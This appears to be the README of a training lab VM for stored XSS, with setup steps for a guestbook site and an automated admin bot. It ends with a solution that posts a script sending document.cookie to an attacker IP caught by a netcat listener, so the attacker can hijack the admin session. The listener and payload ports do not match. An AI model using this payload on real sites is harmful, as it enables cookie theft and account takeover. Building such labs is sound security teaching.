# XSS-attack-1 (Welcome) 

Download VM:
* Credentials: ```user/user```, ```root/123456```
* SSH disabled
* Debian 11, 4 GB disk

# Agenda

Our old friend Bob, who was very pleased with our help earlier, asked us to look at the blog of his old friend Michael, with whom they studied at the Faculty of Journalism. Michael wants to start his own blog too and has turned to a well-known website building company. The company divided the work into several stages, and one of the first stages was the launch of the guestbook. We need to find out if Michael turned to this company for a reason and whether it makes its resources safe.

# Setup

*Requirements:*  **4 GB** of disk space for VM.

Put all files in **web** to folder **/var/www/html/**

```
sudo apt-get update --allow-releaseinfo-change
sudo apt-get install -y nginx php-fpm mariadb-server curl unzip xvfb libxi6 libgconf-2-4 default-jdk wget htop mc unzip php-mysql maven sudo

sudo chown www-data:www-data -R /var/www/html/
sudo chmod 755 -R /var/www/html/*
```

#### Chrome driver and selenium setup
```bash
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo apt install ./google-chrome-stable_current_amd64.deb
wget https://chromedriver.storage.googleapis.com/2.41/chromedriver_linux64.zip
unzip chromedriver_linux64.zip
sudo mv chromedriver /usr/bin/chromedriver
sudo chown root:root /usr/bin/chromedriver
sudo chmod +x /usr/bin/chromedriver
rm -f google-chrome-stable_current_amd64.deb
rm -f chromedriver_linux64.zip
```    
    

#### Database setup
```bash
    sudo mysql -e "UPDATE mysql.user SET Password = PASSWORD('12345') WHERE User = 'root'"
    sudo mysql -e "DELETE FROM mysql.user WHERE User='';"
    sudo mysql -e "DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');"
    sudo mysql -e "DROP DATABASE IF EXISTS test;"
    sudo mysql -e "create database guestbook";
    sudo mysql -e "CREATE USER 'admin'@'localhost' IDENTIFIED BY 'admin'";
    sudo mysql -e "GRANT ALL PRIVILEGES ON guestbook . * TO 'admin'@'localhost'";
    sudo mysql -e "FLUSH PRIVILEGES";
```

#### Fill database with data
```bash
sudo mysql -e "CREATE TABLE IF NOT EXISTS guestbook.posts (  \`id\` INT NOT NULL AUTO_INCREMENT, \`content\` MEDIUMTEXT NULL,  PRIMARY KEY (\`id\`))ENGINE = InnoDB;";
sudo mysql -e "CREATE TABLE IF NOT EXISTS guestbook.users (  \`id\` INT NOT NULL AUTO_INCREMENT,  \`login\` VARCHAR(45) NULL,  \`password\` VARCHAR(45) NULL,  PRIMARY KEY (\`id\`))ENGINE = InnoDB;";
sudo mysql -e " insert into guestbook.users(\`login\`,\`password\`) values ('admin','30bdad3b2f064123f40da204e6172db6');";
```

#### Nginx configure

Change **/etc/nginx/sites-enabled/default** (php-fpm version may be different):
```bash
		server {
				listen 80 default_server;
				listen [::]:80 default_server;
				root /var/www/html;
				index index.php;
				server_name _;
				location / {
						try_files $uri $uri/ =404;
				}
				location ~ \.php$ {
						include snippets/fastcgi-php.conf;
						fastcgi_pass unix:/run/php/php7.3-fpm.sock;
				}
		}

```
Reload nginx config
```bash
sudo service nginx restart
#sudo systemctl restart nginx
```

#### Bot setup
There are several command-line options for the bot:
 - -l,--login 
 - -p,--password
 - -h,--host - if not set, bot will try to get IPV4 from metadata ```169.254.169.254/latest/meta-data/public-ipv4```. You can set your host if not used in the cloud. See sample below.
 - -s,--screenshot - if set, will make a screenshot. Good for debugging.



Put bot folder to some folder on disk, for example **/home/user/bot**. 

Bot folder structure:
- /home/user/bot/src
- /home/user/bot/pom.xml


Build bot from source code:
```
cd /home/user/bot
mvn package
```

Create cron job with bot:
```
* * * * * java -jar /home/user/bot/target/bot-1.0.jar -l admin -p someStrongAndUltraSecretpass --screenshot /home/user/admin.jpg >/dev/null 2>&1
```

Don't forget to restart cron
```
sudo service cron restart
#or
systemctl restart cron
```



You can set host by yourself:

```
java -jar /home/user/bot/target/bot-1.0.jar -l admin -p someStrongAndUltraSecretpass -h 192.168.93.150 --screenshot /home/user/admin.jpg 
```

One-liner to automatically get IP address 

```bash
java -jar /home/user/bot/target/bot-1.0.jar -l admin -p someStrongAndUltraSecretpass -h `hostname --all-ip-addresses` --screenshot /home/user/admin.jpg
```




## How to check that everything works ?

1. Open the main page. You should see the working app. Try to login with ```admin/someStrongAndUltraSecretpass```
2. If you set cron correctly with screenshot option (```--screenshot /home/admin/admin.jpg```), you should get image ```/home/admin/admin.jpg```. Download it and check if you can find text **Hello, Michael!** on the image - everything is fine. If not, the bot could not authorize, and you need to check your cron job.



## Solution

This task is about Stored XSS.
It's better to use **netcat** to solve this task.
- Run **nc** on you host with command : ```nc -lvp 8888```. Assume your host IP address is **10.10.10.10**
- Post next comment:
    ```javascript 
    <script type="text/javascript">
    document.location='http://10.10.10.10:9999/?c='+document.cookie;
    </script>
    ```
- Wait some time, and you will see Admin cookies;
- With the CookieEditor extension (or other), you can change cookies and authorize as Administrator.

